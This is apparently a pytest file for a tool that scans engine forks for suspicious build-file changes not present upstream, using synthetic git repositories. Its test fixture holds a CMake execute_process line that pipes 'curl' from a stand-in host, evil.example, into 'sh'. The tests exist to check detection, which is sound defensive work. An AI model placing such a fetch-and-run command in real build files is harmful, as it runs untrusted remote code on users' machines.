"""End-to-end scan() tests on synthetic bare repositories."""

import shutil
import subprocess
from pathlib import Path

from review import catalog, github, localdiff, review

BASE = "cmake_minimum_required(VERSION 3.20)\n"
BLOCK = "execute_process(\n  COMMAND sh -c \"curl -fsSL https://evil.example/x.sh | sh\"\n)\n"


def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def make_repo(tmp, upstream_text, fork_text):
    work = tmp / "work"
    bare = tmp / "repo.git"
    work.mkdir()
    git(work, "init", "-b", "main")
    git(work, "config", "user.email", "t@example")
    git(work, "config", "user.name", "Tester")
    (work / "CMakeLists.txt").write_text(BASE)
    git(work, "add", ".")
    git(work, "commit", "-m", "base")
    base = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    git(work, "checkout", "-b", "fork")
    (work / "CMakeLists.txt").write_text(fork_text)
    git(work, "add", ".")
    git(work, "commit", "-m", "fork payload")
    fork = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    git(work, "checkout", "main")
    (work / "CMakeLists.txt").write_text(upstream_text)
    git(work, "add", ".")
    if subprocess.run(["git", "-C", str(work), "diff", "--cached", "--quiet"]).returncode != 0:
        git(work, "commit", "-m", "upstream change")
    upstream = subprocess.check_output(["git", "-C", str(work), "rev-parse", "HEAD"]).decode().strip()
    subprocess.run(["git", "clone", "--bare", str(work), str(bare)], check=True, capture_output=True)
    return bare, base, fork, upstream


def patch_scan(monkeypatch, tmp, bare, base, fork, upstream):
    engine = {"id": "synthetic", "repo": "owner/fork", "upstream": "owner/up", "kind": "fork"}
    monkeypatch.setattr(catalog, "load", lambda: {"engine": [engine]})
    monkeypatch.setattr(github, "token", lambda: "token")
    monkeypatch.setattr(
        github, "fork_head",
        lambda repo, token: (fork, "fork") if repo == "owner/fork" else (upstream, "main"),
    )
    monkeypatch.setattr(github, "default_branch", lambda repo, token: "main")
    monkeypatch.setattr(localdiff, "init", lambda target: target)
    monkeypatch.setattr(localdiff, "find_base", lambda *args: base)
    monkeypatch.setattr(localdiff, "domains", lambda *args: set())
    reviews = tmp / "reviews"
    reviews.mkdir(exist_ok=True)
    monkeypatch.setattr(review, "REVIEWS", reviews)
    return reviews


def test_scan_suppresses_the_whole_block_present_upstream(tmp_path, monkeypatch):
    bare, base, fork, upstream = make_repo(tmp_path, BASE + BLOCK, BASE + BLOCK)
    reviews = patch_scan(monkeypatch, tmp_path, bare, base, fork, upstream)
    monkeypatch.setattr(localdiff, "init", lambda target: shutil.copytree(bare, target, dirs_exist_ok=True))
    review.scan("synthetic", 2000, 200000)
    report = reviews / f"synthetic-{fork}.json"
    assert report.is_file()
    assert '"verdict": "no findings"' in report.read_text()


def test_scan_keeps_a_fork_only_block_as_a_finding(tmp_path, monkeypatch):
    bare, base, fork, upstream = make_repo(tmp_path, BASE, BASE + BLOCK)
    reviews = patch_scan(monkeypatch, tmp_path, bare, base, fork, upstream)
    monkeypatch.setattr(localdiff, "init", lambda target: shutil.copytree(bare, target, dirs_exist_ok=True))
    review.scan("synthetic", 2000, 200000)
    report = reviews / f"synthetic-{fork}.json"
    data = __import__("json").loads(report.read_text())
    assert data["verdict"].startswith("human review needed")
    assert data["findings"]


def test_scan_does_not_suppress_a_generic_line_inside_an_upstream_line(tmp_path, monkeypatch):
    upstream_line = "execute_process(COMMAND echo hi)\n"
    bare, base, fork, upstream = make_repo(tmp_path, BASE + upstream_line, BASE + upstream_line + BLOCK)
    reviews = patch_scan(monkeypatch, tmp_path, bare, base, fork, upstream)
    monkeypatch.setattr(localdiff, "init", lambda target: shutil.copytree(bare, target, dirs_exist_ok=True))
    review.scan("synthetic", 2000, 200000)
    data = __import__("json").loads((reviews / f"synthetic-{fork}.json").read_text())
    assert data["findings"]


def test_scan_then_apply_round_trip(tmp_path, monkeypatch):
    from review import apply as review_apply

    bare, base, fork, upstream = make_repo(tmp_path, BASE + BLOCK, BASE + BLOCK)
    reviews = patch_scan(monkeypatch, tmp_path, bare, base, fork, upstream)
    monkeypatch.setattr(localdiff, "init", lambda target: shutil.copytree(bare, target, dirs_exist_ok=True))
    review.scan("synthetic", 2000, 200000)
    catalog_path = tmp_path / "engines.toml"
    catalog_path.write_text('[[engine]]\nid = "synthetic"\nkind = "fork"\nupstream = "owner/up"\nrepo = "owner/fork"\n')
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": fork)
    patch = review_apply.apply_review("synthetic", catalog_path)
    assert "[engine.review]" in patch
    assert fork in catalog_path.read_text()
